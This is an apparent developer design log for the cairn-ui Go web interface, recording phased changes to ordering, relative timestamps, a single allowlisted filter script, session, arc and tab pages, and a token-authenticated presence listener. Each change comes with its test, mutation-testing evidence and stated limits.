## What this phase's guards still cannot see

- **The pod and the page are not compared over the wire.** They share the report functions and the
  sentences, so they cannot disagree about a count; nothing sends one request to both and diffs what
  each says about the same scope.
- **A real deployment's journal.** No read-only volume, no pod appending while the UI reads. A read
  racing an append sees the old file or the new one, possibly with a torn tail the fold ignores —
  argued from `arcs.fold`, not measured here.
- **Scale.** The cards load the store twice more per scope page (sessions, arcs) on top of `Visible`,
  and the arc page walks every readable scope for member writes. Fixture-sized only.
- **Reads.** Every answer says reads are not recorded; that is the plan's deferred phase.
- **Axe as a gate.** The walk's refusals do not refuse on axe violations, and the job is
  `continue-on-error`.

## 🔴 Recency order, relative time, the ONE script, and a copy trim — operator decisions

Six operator decisions landed together; this section records what each bought and what guards it.

**Newest first, through recall's own number and comparator.** The scope page lists entries by the
entry FILE's mtime on the pod's store, newest first; the root page orders scope cards by each
scope's NEWEST entry (`Scope.MTime`). Both read `report.FileMTime` — CPython's `st_mtime` double,
the number recall's index is ordered by — and sort with `report.NewerFirst`, the comparator
`report.ListingOrder` now calls too. One reader and one comparator, so a same-second pair (which a
`ModTime().Unix()` reader would tie) lists in the same order here as in `cairn recall`; ties on the
exact double break by ref (rows) or name (cards). Ordering happens at RENDER, not in `Visible`, so
the tag listing and the navigation page keep the index order their comments promise. The card's
preview refs follow the same order.

**Relative time is server-side against the injected clock.** `PageView.Now` is `Config.Now`, and
`timeAgo` renders `<time datetime="<RFC 3339 UTC>" title="<absolute UTC>">5m ago</time>`. Buckets
(all FLOOR): under a minute (or up to a minute in the future) `just now`; `Nm ago`; `Nh ago`;
`Nd ago` below 30 days; past that — or more than a minute in the future — the absolute UTC date.
An mtime of 0 (stat failed) renders no timestamp rather than the epoch; a zero clock renders dates.
The entry page's provenance block gains an `updated` row.

**The ONE script.** The scope page's entry filter is `filter.js`, embedded, served at a
content-hashed `GET /static/filter.<12 hex>.js` (`classPublic`, `immutable`, `text/javascript`,
`nosniff`), linked only from the scope page. It is a case-insensitive SUBSEQUENCE match, per field,
over the ref, title, aliases and tags the server put in each row's `data-filter`; every
whitespace-separated term must match some one field; no ranking (the recency order stands). It
reads only `data-filter` and the box, writes only `hidden` and the count's `textContent`. The
control is rendered `hidden` and the script reveals it, so with script off every row shows and no
dead box does. This REVERSES the package's zero-script property; the exact claim that replaces it
is: **every script element this server renders is a same-origin `src` named by
`AllowedScriptSources`, at most once, never inline** — a claim about the ORIGIN's bytes; a script
injected downstream reaches the served page and no guard here can see it (see the edge-injection
measurement above). Held by `TestEveryBrowsePageCarriesOnlyAllowlistedScripts` (rendered
bytes, five negative controls), `uiaudit`'s `refuseWalkRegressions` (the browser's
`document.scripts`, inline/foreign/duplicate each refused, plus a positive control that the
allowlisted one passes), and `TestTheFilterScriptTouchesOnlyWhatItSays` (a SPELLING guard over the
file's code, labelled as one). `rawban_test.go` is untouched: the tag is `h.Script(h.Src(…))`.

**Copy removed.** The rendered entry view's explainer (`entryWhat`), the root and scope legends,
and the visible definition lines under Aliases / Refs / Tags (with `RefsKeyDescription`,
`TagsKeyDescription`, their two pin tests and the `ui-tags-key-description-loses-both-its-claims`
battery row). Short definitions moved to `title=` tooltips on those headings. `entryRawWhat` is
KEPT: it says something the raw view cannot show (nothing is parsed; invalid UTF-8 is the one
substitution). A second approved round then removed the entry page's "What am I looking at?"
legend and the scope explainer (`scopeWhat`) from the root cards and the scope page; "scope" keeps
a short `title=` on the root card's kind label. `TestNoPageCarriesALegendOrTheScopeExplainer`
asserts it by element and class (no `<details>` on any browse page, no `card-what` on the root or
in the scope page's own card, with the raw view's explainer as the positive control): RED at the
previous head `458ef8a` with 4 findings, green after.

**Chips, and History.** Aliases (inert), refs (mono; refused refs keep `.task.refused`) and tags
(links to `/?tag=`) render as pills on the entry page and on scope rows — the `ul` carries `chips`
plus a modifier, so every `li`-level class other guards read is unchanged. `## Nuance /
work-history` is DISPLAYED as "History" with the verbatim line in its tooltip; the entry page drops
its bullet count; scope rows say "N history notes". Display only: no file format, parser, raw view
or `internal/report` byte moved.

### The RED proof

Base-compatible guards were run against `origin/main` with only the new test files copied in:

| guard | origin/main | HEAD |
|---|---|---|
| `TestTheScopePageListsEntriesNewestFirstWithTiesByRef` | RED (alphabetical order) | green |
| `TestTheRootPageOrdersScopeCardsByTheirNewestEntry` | RED | green |
| `TestEveryTimestampIsRelativeToTheInjectedClockWithItsInstantPinned` | RED (no `<time>`) | green |
| `TestTheRemovedDefinitionCopyIsAbsentAndChipsArePresent` | RED (22 findings) | green |
| `uiaudit`'s `TestTheEntryFilterNarrowsRowsInARealBrowser`, against a base-built binary | RED (control never visible) | green |
| `TestTwoEntriesInsideOneSecondAreOrderedByTheirFraction`, `TestRelativeTime…`, the script tests | RED by COMPILATION (new symbols) — weaker evidence, stated as such | green |

A mutation battery over this change (18 mutants: comparator reversed, tie reversed, either sort
removed, a scope dated by its first entry, the mtime zeroed or truncated to the second, the
allowlist emptied, an inline script on root, the filter twice, a script on the entry page, two
bucket off-by-ones, a non-RFC 3339 `datetime`, `innerHTML` in the script, aliases dropped from
`data-filter`, the control visible without script, the History rename reverted) killed all 18 with
the named guard. A `filter.js` mutant swapping the subsequence for `indexOf` was killed by the
browser test.

### What these guards cannot see

- Ranking: the filter does not rank, so nothing measures relevance order.
- Large scopes: the filter is O(rows × fields) per keystroke, measured only at 17 rows.
- The filter's behaviour with script disabled is pinned server-side (the control renders `hidden`)
  and not in a browser with script off.
- Clock skew between the pod's filesystem and its clock beyond the one-minute grace renders a date.


# Phase I — scope tabs, a cross-scope session page, and the numbers-not-prose pass

Three operator requests landed together: the session ids under "Sessions that wrote here" should
be clickable; entries, sessions and arcs should be tabs; and the sessions/arcs views read as the
same prose wall the entries view had before PR #191.

| route | class | what |
|---|---|---|
| `GET /scope?id=<control.ID>&tab=sessions\|arcs` | `content` | the SAME row; `tab` selects which panel is rendered. Entries is the default and has no `tab=` in its URL |
| `GET /session?session=<id>` | `content` | NEW: one writing session's attributed bullets across EVERY scope the caller can read, grouped by scope (newest activity first), each bullet linked to its anchor on the entry page; the arcs (home readable) that list it as a member |

## 🔴 The session page is the first browse page keyed by a value that is not scoped

A session id is global — whoever wrote the trailer chose it — so this is the one page that
AGGREGATES across scopes, and its narrowing is the whole design. `StoreSource.Session` hands
`scopeSetOf(auth.NamedScopes(control.VerbRead))` — the ONE narrowing `Visible`, `Touched` and `Arc`
use — to `report.SessionAcross`, which loads an index narrowed to it, scans only files that index
names, and applies the arc rule (home readable, Q1) itself. Nothing the request supplies names a
scope. `report.SessionAcross` is a STRUCTURED answer with no `RenderText`: it lives in
`internal/report` only because the arc rule does; no printed byte moved.

**No existence oracle.** A session that wrote only in scopes the caller cannot read, an id nobody
wrote, an id the trailer grammar cannot produce (`write.SessionComponent`, 64 bytes of
`[A-Za-z0-9_.-]`) and a case variant of a hidden id all answer **404 with `sessionUnseenBody`**,
the same bytes, naming nothing. The grammar check runs BEFORE any read, so a hostile query string
costs one regexp match (`TestAHostileSessionIdIsBoundedBeforeAnyRead` counts the walks). The id is
byte-exact — never folded, trimmed or lowercased. An unreadable journal with nothing else visible
is a 503, never the 404: "could not look" is not "nothing there".

**Bullet anchors.** Every nuance bullet on the entry page carries `id="b-<citation id>"` —
`store.JournalBullet.CitationID`, the value `touch.BulletRef.CitationID` records, so link and
anchor are one value from one function. A citation id is never empty (8 hex of a SHA-256) but is
NOT unique: byte-identical bullets share one. The first gets `b-<cid>`, the n-th repeat
`b-<cid>-<n>`; a link lands on the first, which carries the same text, date and trailer.
`TestEveryBulletLinkOnTheSessionPageLandsOnAnAnchorThatExists` follows every link across the seam.

## 🔴 Tabs are server-rendered, and only the selected panel is in the document

`entryViewTabs`' ruling for the same shape: a link per tab gives a shareable URL and a working back
button with no script, the current tab is a `<span>`, and the filter script rides only on the
entries tab — the only one that renders its control. An UNKNOWN `tab` value (a typo, a case
variant, `entries`) renders the entries tab rather than a 400: a view selector is not an authority
question, `?view=`'s ruling.

⚠ **The tab-label counts cost the two per-scope reports on every tab.** "Sessions N" IS
`report.Sessions` and "Arcs N" IS `report.Arcs`; a count of what a tab lists is that tab's
derivation, so there is no cheaper number that is the same number. Before this change the page
computed both on every load (as two cards); the tab decides what is RENDERED, not what is read. A
count that is not a measurement (journal off or unreadable, nothing scannable) is left off rather
than printed as 0, and a lower bound carries `≥`.

## 🔴 Numbers, tooltips, and a badge only when partial

The sessions tab, arcs tab, arc page and session page carry ONE stats row of numbers ("2 sessions ·
3 of 4 bullets attributed"); every caveat sentence the cards printed rides on the matching stat's
`title=` — `internal/report`'s own exported line, never a second spelling, so the CLI's bytes are
untouched. The `card-what` explainers (`sessionsWhat`, `arcsWhat`, `arcWhat`) are deleted. The
attributed K of N is never omitted where something was scanned. `badge-warn` renders ONLY on a
partial answer: rejected or unreadable entries (lower bound), nothing scannable (unmeasured), a
damaged journal, an unmeasured writer leg, a carried member. Readers-unmeasured is NOT a badge
cause: it is this phase's universal state (reads are not collected at all) and a badge on every
arc would be a badge nobody reads; it stays in the tooling-coverage tooltip.

Rows are compact. A session row is its first 8 bytes (full id in `title=`), actor, bullet count,
last write and arc chips, and the whole row is one link (`.row-link::after` stretched over it, the
chips above it). An arc row is its status badge (Q4 unchanged: one badge class, `unknown` is
`unknown`), provenance word (full provenance as tooltip), closing kind, registered-at, declared
scopes as chips (linked where readable) and members as session links. Bullet dates render at DAY
precision ("today", "3d ago"): the bytes carry no time of day.

## `uiaudit`: the cap became round-robin by row

The per-page expansion cap kept "the first four by sorted path". The scope page now publishes its
tab links beside its entry links and `/entry` sorts first, so the cap bounded away both tabs — and
with them every `/session` and `/arc` page, reachable only through them — with nothing going red.
`roundRobinByRow` takes the first of each ROUTE, then the second, and so on; still deterministic.
`TestExpandLinksKeepsEveryRowAPageLinksWhenTheCapBites` is red on the prefix cap.
`ui.SessionPath` joined `linkExpanded`.

## Cost, measured

`BenchmarkSessionPageAndScopeTabs` (`go test ./internal/ui/ -run '^$' -bench BenchmarkSessionPageAndScopeTabs
-benchtime 20x`) over a synthetic store, one host, idle, ms per request:

| size | session page | scope tab (entries / sessions / arcs) | entry page (the baseline every browse page pays) |
|---|---|---|---|
| 10 scopes × 30 entries | 16.4 | 13.8 / 14.3 / 13.7 | 9.1 |
| 30 scopes × 100 entries | 185 | 145 / 147 / 148 | 107 |

Roughly linear in entries. The session page costs ~1.7× the entry page at 3,000 entries: `Visible`
(which every browse page already pays) plus one `touch.Writes` per readable scope. The tab counts
add ~40 ms over the entry page at that size, because `report.Sessions` and `report.Arcs` EACH load
the narrowed index. Nothing is cached, deliberately; if a deployment outgrows this, the fix is a
cache in front of `Source`, not a second narrowing.

## The RED proof

New tests were copied onto `origin/main` (`64475d7`) with a scratch-only shim supplying the new
identifiers as literals, so their verdict there is behaviour rather than a compile error:

| guard | origin/main | HEAD |
|---|---|---|
| `TestTheSessionPageAggregatesReadableScopesNewestFirstAndOmitsAnUnreadableOne` | RED (no route) | green |
| `TestASessionOnlyInAnUnreadableScopeAnswersExactlyLikeOneNeverWritten` | RED | green |
| `TestAHostileSessionIdIsBoundedBeforeAnyRead` | RED | green |
| `TestEveryBulletLinkOnTheSessionPageLandsOnAnAnchorThatExists` | RED | green |
| `TestEachScopeTabRendersOnlyItsOwnPanel` | RED (no panels; filter + script on every `tab=`) | green |
| `TestTheTabLabelsCarryPairwiseDistinctCounts` | RED | green |
| `TestThePartialBadgeRendersOnlyWhenTheAnswerIsPartial` | RED (no panel) — weak; the battery below is the real proof | green |
| `TestTheRemovedProseIsAbsentAndEveryCaveatIsATooltip` | RED (fails at the missing session page) — weak; same | green |
| `uiaudit`'s `TestExpandLinksKeepsEveryRowAPageLinksWhenTheCapBites` | RED with the prefix cap restored | green |
| `report`'s three `SessionAcross` tests, `TestTheSessionPageEscapesAPlantedHostileValueInEveryPosition`, `TestEveryBulletAnchorOnAnEntryPageIsUnique` | RED by COMPILATION only (new symbols) — weaker evidence | green |

A one-edit battery over this change, each scored by the named test's own `--- FAIL` line after an
all-PASS baseline: **19 mutants, 19 killed** — the session walk unrestricted (UI and report),
hidden-home arcs listed, scope order reversed, the grammar bound skipped, a second unseen-body
spelling, anchors dropped, duplicate anchors, tab selection ignored, an unknown tab passed through,
the script on every tab, the sessions label printing the entry count, each partial badge forced on
and off, a caveat printed visibly, a `card-what` restored, the attributed stat dropped. Eight of them
are rows of `tests/control_mutants.py` (`ui-session-*`, `ui-bullet-anchor-dropped`,
`ui-scope-tab-selection-ignored`, `ui-*-partial-badge-*`) so CI re-runs them; the S4 rows whose
patterns moved were re-cut and still kill.

The S4 arcs tests were ADAPTED, not weakened: each still makes its claim (home rule, unknown is not
open, off/broken/empty, encoded hrefs) against the tab that now carries it, and the hidden-arc leak
check now runs over all three tabs. The href guard now also plants a hostile member id and requires
every `/scope`, `/arc` and `/session` href on the panel to round-trip.

## What these guards still cannot see

- **Scale beyond one host's measurement.** Nothing is cached; the session page re-walks every
  readable scope per request. Measured above at two sizes (300 and 3,000 entries), roughly linear
  between them; nothing is measured beyond 3,000. The sessions tab adds one labelling pass over its
  rows (`shortIDsIn`), O(N log N) — `BenchmarkShortIDsIn`: 0.36 ms at 4,000 ids and 1.9 ms at
  16,000, against 44 ms and 680 ms for the first, pairwise draft on the same host.
- **The pod has no session route**, so there is no second surface to compare this answer against.
- **Bullet excerpts** come from the narrowed `Visible` answer the page already holds; a bullet whose
  citation id the entry page could not reproduce would render with no excerpt — not measured, and
  `TestEveryBulletLinkOnTheSessionPageLandsOnAnAnchorThatExists` is what would see the anchor half.
- **Tooltips are not visible on touch devices.** The caveats are one hover away on a desktop and
  one long-press (browser-dependent) on a phone.

## Audit round 1 — five fixes, each watched red on its mutant

| finding | change | guard | mutant → verdict |
|---|---|---|---|
| `ArcLine.DeclaredVisible`'s filter had no test; unfiltered, the arcs tab NAMED a hidden declared scope (`scopeChip` falls back to the plain name) | none — the filter was right; the guard was missing | `TestAnArcDeclaringAHiddenScopeNeverNamesItOnAnyPage` (arcs tab, sessions tab, arc page, session page; W as the positive control) — an INVARIANT guard, not regression coverage | `if true {` → KILLED; also a `control_mutants.py` row (`ui-arc-row-names-a-hidden-declared-scope`) |
| "unreadable journal + nothing visible → 503" had no test | none | `TestAnUnreadableJournalWithNothingVisibleIsA503NotTheUnseen404` (also: a grammar-refused id stays 404; a visible session stays 200 with `arcs unknown`) | `if false && …` → KILLED |
| a new uiaudit test sat between another test's doc comment and its func | moved | — | — |
| two ids sharing their first 8 bytes rendered as identical rows | `shortIDsIn`: per rendered list, the shortest prefix ≥ 8 bytes no OTHER id in the list shares (order-independent; an id that prefixes another renders in full one byte past it). Sessions tab, arc rows' member chips, arc page members | `TestShortIDsAreTheShortestUniquePrefixOfAtLeastEight`, `TestCollidingSessionIdsRenderAsDistinguishableRows` | fixed 8-byte labels (the pre-fix code) → KILLED; "never lengthen" → KILLED |
| the session page's excerpt repeated the `[cairn: actor/session]` trailer | `bulletExcerpt`: the whole bullet body collapsed to one line, minus the END-ANCHORED trailer run via the new `write.WithoutTrailers` (the run `trailerRunStart` locates — the same one `ParseAttributions` reads). Session page only; entry page and raw view unchanged | `TestTheSessionPageExcerptDropsTheTrailerAndKeepsAMidProseToken` (a mid-prose `[cairn:` is kept, the entry page still shows the trailer); `write`'s `TestWithoutTrailersRemovesOnlyTheEndAnchoredRun` | unstripped (the pre-fix code) → KILLED; strip-every-`[cairn:` regex → KILLED |

⚠ The same session id can now render at two LENGTHS on two pages: a label is a property of the list
it sits in. The full id is always `title=` and the link operand, never the label.

# Phase J — the arcs-first page and the arc page's tabs (S1 of the arcs/presence plan)

Slice S1 of `claudedocs/plan-cairn-arcs-presence.md`: operator decisions O1 and O2, plan decisions
10, 12 and 13. No presence — that is S2 onward.

| route | class | what |
|---|---|---|
| `GET /arcs` | `content` | NEW: every arc homed in a scope the caller can read, LIVE ones first; `?all=1` lists every one. Linked from the header of every page ("Arcs"). `/` is unchanged (decision 13, open question P1) |
| `GET /arc?home=<control.ID>&slug=<slug>&tab=sessions` | `content` | the SAME row; `tab` selects the panel. Scopes is the default and has no `tab=` in its URL |

## 🔴 The data comes from `internal/report`, the clock from here

`report.ArcsAcross` is a STRUCTURED answer with no `RenderText` (`report.SessionAcross`'s shape and
reason: the arc rule lives in that package), so no printed byte moved. It is handed the ONE
narrowing every browse read uses, keeps a registration only when its HOME is readable, and walks
the narrowed index ONCE — `touch.Writes` per readable scope, each session's newest `LastDate` kept —
so an arc's newest member bullet is a lookup, not a walk per arc. A member's bullet in a scope the
caller cannot read never reaches the answer. The date comes back AS WRITTEN, because `internal/report`
holds no clock; `arcsindex.go` applies what needs one:

- **last updated** = max(the latest registration's pod-clock `registered_at`, the newest member
  bullet CLAMPED TO TODAY and taken as 00:00 UTC). A tie goes to the registration (it carries a time
  of day). `reported_at` is the tooling's clock and optional: shown in the row's tooltip, never used.
  The row says which won — "registered 3h ago" or "bullet today" — through `instantAgo` / `dateAgo`.
- **live** = `open` OR last updated at most 14 WHOLE days ago — ⌊(now − last updated) / 24h⌋ ≤ 14,
  the truncation the row's "Nd ago" label uses, so "14d ago" is live and "15d ago" is not, whichever
  source won. `unknown` is NOT `open` (Q4). Two earlier shapes were measured wrong in audit: an
  instant comparison (`≤ 14×24h`) hid rows labelled "14d ago"; a per-source rule hid an arc with
  strictly newer activity than a live one.
- newest first, ties by `(home, slug)`; the page prints "N not live" — a count over VISIBLE arcs
  only — and offers "show all N" (`?all=1`) or "live only". Only `1` is recognised; any other value
  is the default view, `?view=`'s ruling.

🔴 **O1's cost is pinned, not just accepted.** A trailer's session is self-declared, so a bullet
written under ANOTHER actor naming a member session keeps an arc live.
`TestABulletNamingAMemberByANonMemberKeepsTheArcLive` is an INVARIANT GUARD — a tripwire, not
regression coverage (`ArcsAcross` keys on the session id and never reads the actor) — so "fixing" it is a
red test and a decision, never a silent change.

## 🔴 `/arc` tabs: scopes · sessions, and no third

`ScopePage`'s shape (O2; ruling D1 deleted the entries tab): server-rendered links, the current tab
a `<span>`, only the selected panel in the document, an unknown value (including the scope page's
`arcs`/`entries`) rendering the default tab byte for byte. The tab is read AFTER every refusal, so
each miss is still `report.ArcUnregisteredBody` on every tab. **Scopes** is the union of the
narrowed declared scopes and every readable scope a member wrote in (`ArcReport.WroteIn`), each
marked declared or inferred, with a count of members who wrote there, linking `/scope`. **Sessions**
is the member list, linking `/session`. Both lay out data the page already held — no new read.

⚠ **Also fixed on the way:** `handleArcPage` built its view without `Now`, so the arc page printed
registration times as absolute dates while every other browse page printed relative ones.

## Ledgers moved together

The `routes` row and `ArcsPath`; `routes_test.go`'s hand ledger, `bareGETAnswer` (200: the bare
request IS the page) and `contentAuthority` (`source`); `Source.Arcs` (counted by `countingSource`);
`uiaudit/targets.go` (`ArcsPath` in `linkExpanded` — `TestTheREALLedgerIsFullyACCOUNTEDFor` was red
until it joined) and `uiaudit/boot.go` (a recent, an open-old and a closed-old arc, so the live view,
the not-live count and the toggle all render); `tailwind.css`/`app.css` (`.nav-arcs a` joins the
header-link rule); nine `tests/control_mutants.py` rows. NOT `flake.nix` (no embedded asset), NOT
the corpus (a browser row), NOT the `go` job's `ok` floor (no new package).

## Cost, measured

`BenchmarkSessionPageAndScopeTabs` gained an `arcs-page` case (`-benchtime 10x`, local go 1.26.8 —
NOT the pinned 1.25; one host, idle; the RATIO is the claim): **10×30: 15.6 ms against the session
page's 18.8 (0.83×); 30×100: 167 ms against 203 (0.82×)** — the same one whole-store walk, ≤ the
session page at both sizes.

## The RED proof

The behavioural tests were copied onto `origin/main` (`078d248`) with a scratch-only shim supplying
`ArcsPath` and `arcTabURL` as literals:

| guard | origin/main | HEAD |
|---|---|---|
| `TestTheArcsPageListsLiveArcsNewestFirstAndCountsTheHidden` | RED (no route) | green |
| `TestAnArcHomedInAnUnreadableScopeIsNeverListedEvenWhenItsMembersWroteWhereYouRead` | RED (no route) | green |
| `TestAMemberBulletInAnUnreadableScopeDoesNotMoveTheArc` | RED (no route) | green |
| `TestAFutureDatedBulletDoesNotSortAboveToday` | RED (no route) | green |
| `TestABulletNamingAMemberByANonMemberKeepsTheArcLive` | RED (no route) — but an INVARIANT tripwire on O1's accepted cost, not regression coverage | green |
| `TestABulletDatedExactlyFourteenDaysAgoIsStillLive` (audit round 1) | RED at this PR's first head `3c9cd9b` (a bullet dated today−14 hidden at noon while its row said "14d ago") | green |
| `TestLivenessDoesNotDependOnWhichSourceWon`, `TestARegistrationIsLiveExactlyWhileItReadsFourteenDaysAgo` (audit round 2) | RED at `f238b91` (later-arc hidden while the older solo-arc was live; a 14d23h registration hidden) | green |
| `TestTheArcsPageOffAndBrokenStates` | RED (no route) | green |
| `TestTheArcPageRendersOnlyTheSelectedTab` | RED (no panels, no tab strip) | green |
| `TestTheArcScopesTabNarrowsAndMarksProvenance` | RED (no scope rows) — its narrowing half is an INVARIANT guard | green |
| `TestEveryArcMissIsTheSameBytesOnEveryTab` | **green** — an INVARIANT guard (main ignores `tab`), not regression coverage | green |
| `TestTheArcsPageEscapesAPlantedHostileHomeAndSlug`, `TestTheArcTabHrefsEscapeAPlantedHostileSlug`, `report`'s two `ArcsAcross` tests | RED by COMPILATION only (new symbols) — weaker evidence | green |
| `TestTheRouteLedgerMatchesTheDispatchTable`; `uiaudit`'s `TestTheREALLedgerIsFullyACCOUNTEDFor` | RED (the row is undeclared / unaccounted) | green |

Mutants, each a `tests/control_mutants.py` row killed by the test it names, and each watched failing
on that test's OWN assertion before the row was written: the clamp dropped
(`TestAFutureDatedBulletDoesNotSortAboveToday`: order inverted, the future date printed);
`reported_at` read instead of `registered_at`, `unknown` counted as open, the window widened to 15
days (all `TestTheArcsPageListsLiveArcsNewestFirstAndCountsTheHidden`: the listed set and the
not-live count move); the window compared as an instant (`≤ 14×24h`) rather than in whole days —
this PR's first head (`TestARegistrationIsLiveExactlyWhileItReadsFourteenDaysAgo`, plus the bullet
pair and the two-arc case); the member walk unrestricted (`TestAMemberBulletInAnUnreadableScopeDoesNotMoveTheArc`);
the home check dropped (`TestAnArcHomedInAnUnreadableScopeIsNeverListedEvenWhenItsMembersWroteWhereYouRead`);
the arc tab ignored and an unknown tab passed through (`TestTheArcPageRendersOnlyTheSelectedTab`).
Not a row, watched by hand: dropping the member-bullet lookup reddens
`TestABulletNamingAMemberByANonMemberKeepsTheArcLive`.

## What these guards still cannot see

- **Scale beyond the benchmark's two synthetic sizes**, and the real store (plan: "could not
  measure"). Nothing is cached.
- **The exact instant of 15×24h.** The boundary is measured at 14d23h (live, "14d ago") and 15d0h1m
  (not, "15d ago") for a registration and at today−14 / today−15 for a bullet; the single nanosecond
  at exactly 15 days is not.
- **The live view on a deployment with a skewed pod clock**: a `registered_at` in the UI's future is
  not clamped (decision 10 clamps bullet dates only) and sorts first.
- **Tooltips on touch devices**, as Phase I records.

# Phase K — the presence store and its agent listener (S2 of the arcs/presence plan)

Slice S2 of `claudedocs/plan-cairn-arcs-presence.md` (decisions 2–9, 11 as built, 15). It adds
**no browser row**: the store is written by a second listener and read by the browser only through
S4's badges (Phase L, below).
`internal/presence` holds the store, the ring queue, the token file and the agent handler;
`cmd/cairn-ui` wires it, and it and `internal/ui` (added by S4, read-only) are its only importers IN
THE ROOT MODULE — `TestOnlyTheBrowserProgramImportsPresence` is that ledger, red on GROW or SHRINK.
⚠ The nested `uiaudit` module (a test harness, in no image) imports it too; the ledger cannot see it.

| route (SECOND listener) | token kind | what |
|---|---|---|
| `POST /agent/v1/presence` | push | REPLACE this token's `(owner, host)` set; body `{schema, host, rows}`; `200 X-Presence-Status: presence-replaced` + `rows=N` |
| `POST /agent/v1/rings/claim` | claim | body exactly `{}`; `200 {"schema":1,"rings":[{"ring_id","session"}]}` — this token's `(owner, host)` only, each ring once |

`presence.AgentRoutes()` derives that ledger from the dispatch map and
`TestTheAgentRouteLedgerIsExactlyTwoRows` pins it against a hand-written copy; neither row is in
`ui.DeclaredRoutes()`, `api.DeclaredRoutes()` or the corpus.

## 🔴 One owner predicate, and narrowing is read off the viewer's own identity

`presence.Store.For(viewer, session)` is the only read on a viewer's behalf and `Service.Ring` reaches
the queue only through it. Its clauses live in `visible`: the viewer is valid and NOT
`Auth.Narrowed()`, the row's owner equals `(Principal.Kind, Principal.ID)` — both halves — and the row
is unexpired (`pushed_at + 3 min`). Another owner's presence, expired presence, a narrowed viewer and
no presence are one answer. **The narrowed bit is #195's `control.Authorization.Narrowed()`** — handed
through by the machine-token backend on the bearer path, never set by the cookie backend's
`control.Resolve`, and a session cannot be minted from a narrowed credential ("What a session can be
minted from", above). The plan's first draft derived it from the credential row; decision 11 now
records what was built instead.

The TARGET among several hosts is the newest `last_activity`, empty sorting oldest, ties (two empties
included) to the byte-wise smaller host label; the other hosts are `AlsoOn`.

## 🔴 The agent listener: its own bind verdict, its own tokens, no cookies

- **All three flags or none** — `-presence-agent-addr`, `-presence-tokens`, `-presence-owner
  <kind>:<id>`. None ⇒ no listener (the startup line says `presence off`). A subset, a value that
  reduces to nothing, an owner the authority does not hold, or a non-`host:port` address refuses
  (78). Flags only, no environment spelling: presence must be a reviewable line naming its owner.
- **The reachable-bind refusal runs on the AGENT's bind**, with the same `bindIsReachable` and the
  same `$CAIRN_TRUSTED_PROXIES`; a loopback browser bind does not license a `0.0.0.0` agent bind. Its
  `netid.RateLimiter` is its own, keyed by `netid.ResolveClient`. The listener is bound before
  anything serves, so a bind failure is a refusal, not a dying goroutine.
- **Tokens authenticate nothing else.** They are SHA-256 digests in `-presence-tokens`, one row
  `<push|claim> <kind>:<id> <host> <hex>`, re-read on EVERY agent request (delete a row ⇒ the next
  request is 401, no restart; a vanished file ⇒ every request 401). A push token cannot claim and a
  claim token cannot push — the kind is part of the match, so the refusal is garbage's. Nothing
  outside the agent listener can read a presence token because nothing else parses one (the browser
  only calls `Store.For`; the ledger above). A refused row is reported by line number and FIELD, never its value, so a
  token pasted into the wrong column does not reach the log; a mint appends after a `\n` when the
  file's last line lacks one.
- **The single-owner wall (decision 15)** is ONE function, `admit`. At startup, a row for another
  owner — or any malformed row or duplicate digest — means the AGENT LISTENER IS NOT STARTED: the
  process keeps serving the browser surface, prints `WARNING the presence agent listener is NOT
  started` naming the file line, and announces `presence agent NOT started` on its startup line. An
  UNREADABLE token file is a flag error and refuses the process (78). A row appearing after startup
  is refused as that ROW, logged once with its 12-hex digest prefix, while the owner's rows keep
  working. The mint enforces the wall too.
- **The wire** (decision 8) is exact both ways: `DisallowUnknownFields` refuses every never-carried
  field (`pane_preview` first), and a MISSING key is a 400 as well. ≤ 256 rows, every string ≤ 128
  bytes and free of control characters and U+2028/U+2029, sessions by `write.SessionComponent`, `runtime` ∈
  {claude, opencode, other}, `last_activity` empty or RFC 3339, one row per session per push. A body
  whose `host` is not the token's is a 400 and writes nothing. The body cap is 1 MiB: the worst
  LEGAL push, measured with Go's default `json.Marshal` (which escapes `<` to six bytes) with every
  field at its bound — including a 128-byte `last_activity` (RFC 3339 with a long fractional second)
  and a 64-byte host — is over the 512 KiB first chosen and under the cap. Its size is pinned in
  ONE place, `TestAWorstCaseLegalPushIsAccepted`, which also proves it is accepted; it is not
  repeated here. ⚠ S2 shipped quoting a smaller figure from a fixture that left `last_activity` and
  the host short of their bounds.
- **The claim route returned `[]` until S5** — S2 enqueued nothing; the route existed so S3 could
  build its claim service against it. S5's `POST /ring` (Phase M) is what fills the queue.
- ⚠ **Revocation × lockout:** a revoked token's retries count toward the per-client lockout, and
  hosts behind one egress address share that bucket. S3 must stop on a 401 (the plan's S3 test plan).
- **Minting** is `cairn-ui … -issue-presence-token push|claim -presence-owner <kind:id | email |
  project name> -presence-host <label> -presence-tokens <file>`: the owner is resolved ONCE to
  `(Kind, ID)`, the digest appended (file created 0600), the token printed once on stdout, exit 0.

⚠ **One replica.** State is in memory (decision 2); a restart loses ≤ one push interval and any
pending ring. A second replica would split both — the plan's open question P2.

## The RED proof

⚠ **PARTIAL, AND SAID SO.** 27 `presence-*` rows are in `tests/control_mutants.py`, each naming its
killer (the predicate's three clauses and its owner check, the target pick's two comparisons,
whole-host replace, the ring's predicate gate, the queue's owner and host filters, the wall at
startup / on the re-read / in `admit`, the token kind, the push host check, the lockout's two
halves, the wire's unknown-field refusal and three bounds, and five `cmd/cairn-ui` wirings). The
local full-battery run was stopped on operator instruction before reaching them, so their
verdicts are CI's `go` job, not a local measurement. One mutant was watched red by hand and is NOT
a row (it needs two edits): caching the token file at the first read instead of re-reading it
kills `TestRevocationTakesEffectWithoutARestart` alone.

⚠ **Deploy precondition (decision 11):** not before #195 has been live for the instance's
EFFECTIVE session TTL (12 h by default; `-session-ttl` / `CAIRN_UI_SESSION_TTL`), AND a journal
re-check shows no credential with non-null `narrowed_scopes`.

## What these guards still cannot see

- **A bell** — S2 had none; it is Phase M (S5), with `tests/presence/e2e.sh`. The badges are Phase L.
- **The host side** (S3, the tooling repo): whether pushed rows are generation-checked and unique,
  and whether the executor writes only `0x07`.
- **Two replicas**, and a restart's loss of pending rings, are stated, not tested.
- **The refused-row log under churn**: it is said once per distinct line per process, so a row that
  is edited repeatedly is logged once per spelling.

# Phase L — presence badges (S4 of the arcs/presence plan)

Slice S4 of `claudedocs/plan-cairn-arcs-presence.md` (decisions 5, 7, 8, 11, 14; open question P5).
**No new route, no script, no new asset**: the badges reuse `.badge`, and `routes`,
`AllowedScriptSources`, the stylesheet rows and `flake.nix`'s `onlyGo` filter do not move.

| surface | what the OWNER sees |
|---|---|
| `/session` | under the id: `host · target · hotkey · runtime · seen Ns ago`, plus `also on <host>` when another live host presents the session |
| `/scope?…&tab=sessions` | the same badge on the session's row |
| `/arc?…&tab=sessions` | the same badge on the member's row |
